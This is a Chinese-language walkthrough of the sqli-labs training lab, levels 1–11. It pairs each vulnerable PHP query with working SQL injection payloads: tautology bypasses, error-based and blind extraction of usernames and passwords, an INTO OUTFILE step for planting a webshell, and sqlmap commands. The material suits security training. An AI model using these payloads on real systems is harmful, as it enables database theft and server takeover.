# sqli_labs

## L1:单引号闭合

查看源码，这里接受一个变量id作为参数，而id用单引号闭合，我们这边可以采用单引号闭合来完成注入

```
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

具体payload。注意我们闭合之后，需要打一个单引号，前面的`'`是闭合id的`'`,但是后面还有一个`'`,如果不去闭合后面的`'`，则会报语法错误

```
?id='or'1=1    
```

## L2:直接引用变量，无闭合

查看源码，这次直接引用`id`变量

```
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

构造payload，这里的`or`是逻辑运算符，当`or`前面为假时，后检测`or`后面的值，因为`1=1`为永真，于此达到sql注入

```
?id= 1 or 1=1
```

## L3:单引号+括号闭合

查看源码，这次多了个括号闭合

```
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
```

构造payload，逻辑同理，我们需要先把括号闭合掉

法1：构造闭合

```
?id=')or('1=1     
```

法2：注释后续代码,原理是`--+`后续部分的代码被注释掉了

```
?id=' ) or 1=1 --+
```

法3;另一种姿势注释代码

```
?id=' ) or 1=1 #
```

## L4:双引号+括号闭合

查看源码，第一行代码表示在输入的`id`中添加双引号闭合

```
$id = '"' . $id . '"';
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
```

依旧提供三种姿势注入

```
?id=")or("1=1     
?id=") or 1=1 --+
?id=") or 1=1 #
```

## L5:单引号闭合+报错注入

查看源码，发现好像是简单的闭合，注入后没看到账号密码。

![image](https://github.com/user-attachments/assets/18e49c1b-dff0-42b4-a63c-a5389135ddd4)

```
# 直接单引号拼接
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";

# 支持报错、布尔盲注、延时盲注
if true:
    输出 You are in...........
else:
    print_r(mysql_error());
```

因为不输出查询的结果，这就导致不可以使用联合查询的注入方式，但是并不影响正常使用报错

法1：报错注入1

```
?id=1'+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+
```

报错注入2

```
?id=1'+AND(SELECT+1+FROM(SELECT+count(*),CONCAT((SELECT+(SELECT+(SELECT+CONCAT(0x7e,0x27,cast(username+AS+CHAR),0x27,0x7e)+FROM+users+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1--+
```
![image](https://github.com/user-attachments/assets/11f3be6d-8bcc-4363-b6f8-632a7435ef48)


## L6：双引号闭合+报错注入

与L5同理，只需要改变闭合即可

```
?id=1"+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+
```

## L7:闭合+ban报错+布尔盲注or延时盲注

查看源码发现，联合输入被ban，同时不给报错提示，说明报错注入也被ban，但作者提示用`outfile`

```
# 使用单引号加双层括号拼接
$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";

# 支持布尔盲注、延时盲注
if true:
    输出 You are in.... Use outfile......
else:
    输出 You have an error in your SQL syntax
  //print_r(mysql_error());
```
[https://www.sqlsec.com/2020/05/sqlilabs.html#%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E5%88%B0%E6%96%87%E4%BB%B6](https://www.sqlsec.com/2020/05/sqlilabs.html#%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E5%88%B0%E6%96%87%E4%BB%B6)

|                                                                                                                                    |     |     |
| ---------------------------------------------------------------------------------------------------------------------------------- | --- | --- |
| file系列函数                                                                                                                           |     |     |
| into dumpfile()                                                                                                                    |     |     |
| into outfile()                                                                                                                     |     |     |
| load_file()                                                                                                                        |     |     |
| ?id=1')) union select 1,2,'crow' into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\sqli-lab\\Less-7\\test.php'--+<br><br>成功之后写入一句话木马即可 |     |     |

## L8:手工注入累了，下面用sqlmap通杀

```
?id=1'order by 4 --+    //报错，说明存在三列数据
?id=1' union select 11,2,3 --+    //无报错回显说明报错注入同样失效
```

|   |   |   |
|---|---|---|
|布尔型盲注|   |   |
|length()函数|返回字符串长度||
|substr()|截取字符串|substr(str,pos,len);|
|ascii()|返回字符串ascii码，将字符变数字位||
|时间型|   |   |
|sleep()|将程序挂起n秒||
|if(expr1,expr2,expr3)|判断语句，第一个正确执行，第二个错执行第三个||

```
猜解库名长度，下面都可以用大于号小于号逼近判断
?id=1'and (length(database()))=8 --+
利用ASCII码猜解当前数据库名称
?id=1'and (ascii(substr(datatbase(),1,1)))=115--+    //返回正常，说明数据库名称第一位是ascii码值为115
?id=1'and (ascii(substr(database(),2,1)))>101--+    //经常利用大于号小于号进行逼近
猜表名
?id=1'and (ascii(substr(select table_name from information_schema.tables where table_schema=database()limit 0,1),1,1)))=101--+
//如果返回正常，说明数据库表名的第一个的第一位是e
猜字段名
?id=1'and (ascii(substr(select column_name from information_schema.columns where table_name='emails' limit 0,1),1,1))=105--+
//如果返回正常，说明emails表中的列名称第一位是i
```

有时候，页面不返回报错信息，这时候我们就需要用到时间盲注了

```
猜解库名长度，下面都可以用大于号小于号逼近判断
?id=1'and if (length(database())=8 ,sleep(5),1)--+
利用ASCII码猜解当前数据库名称
?id=1'and if ((ascii(substr(datatbase(),1,1))=115),sleep(5),1)--+    //返回正常，说明数据库名称第一位是ascii码值为115
?id=1'and if ((ascii(substr(database(),2,1))>101),sleep(5),1)--+    //经常利用大于号小于号进行逼近
猜表名
?id=1'and if((ascii(substr(select table_name from information_schema.tables where table_schema=database()limit 0,1),1,1)))=101),sleep(5),1)--+
//如果返回正常，说明数据库表名的第一个的第一位是e
猜字段名
?id=1'and if((ascii(substr(select column_name from information_schema.columns where table_name='emails' limit 0,1),1,1))=105),sleep(5),1)--+
//如果返回正常，说明emails表中的列名称第一位是i
```

法二：sqlmap

```
sqlmap -u "http://192.168.203.141/sqli-lab/Less-8/?id=1" --cookie="PHPSESSID=938ba4d9befdd8411a15a447" --batch --dbs
```

## L9:SQLMAP

利用上一题的代码，跑出数据库即可

```
sqlmap -u "http://192.168.203.141/sqli-lab/Less-9/?id=1" --cookie="PHPSESSID=938ba4d9befdd8411a15a447" --batch --dbs
```

## L10:SQLMAP

```
sqlmap -u "http://192.168.203.141/sqli-lab/Less-10/?id=1" --cookie="PHPSESSID=938ba4d9befdd8411a15a447" --batch --dbs
```

## L11:POST型注入

```
sqlmap -r Post-sqlinjection.txt --batch -dbs
